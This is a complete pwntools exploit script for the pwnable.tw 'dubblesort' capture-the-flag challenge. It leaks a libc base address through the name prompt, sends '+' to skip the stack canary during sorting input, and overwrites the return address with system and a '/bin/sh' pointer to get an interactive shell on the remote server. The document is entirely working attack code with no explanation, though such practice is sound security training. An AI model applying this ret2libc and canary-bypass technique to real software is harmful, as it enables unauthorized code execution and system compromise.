from pwn import *
p = process("./dubblesort")

p = remote("chall.pwnable.tw",10101)
elf = ELF("./dubblesort")
libc = ELF("libc_32.so.6")
context.log_level = 'DEBUG'

p.sendlineafter("What your name :",b'A'*24)
p.recvuntil(b'A'*24)

leak_base = u32(p.recv(4)) - 0x01b0000 - 0xa
log.info("LEAK ->"+hex(leak_base))
system = leak_base + libc.symbols['system']
log.info("SYSTEM -> "+hex(system))
binsh =leak_base+next(libc.search(b"/bin/sh"))
log.info("BINSH ADDR ->"+hex(binsh))
p.sendlineafter('to sort :','35')
for i in range(24):
    p.sendlineafter('number : ',b'1')
p.sendline(b"+")
for i in range(9):
    p.sendlineafter('number : ',str(system))
p.sendlineafter('number : ',str(binsh))
p.interactive()
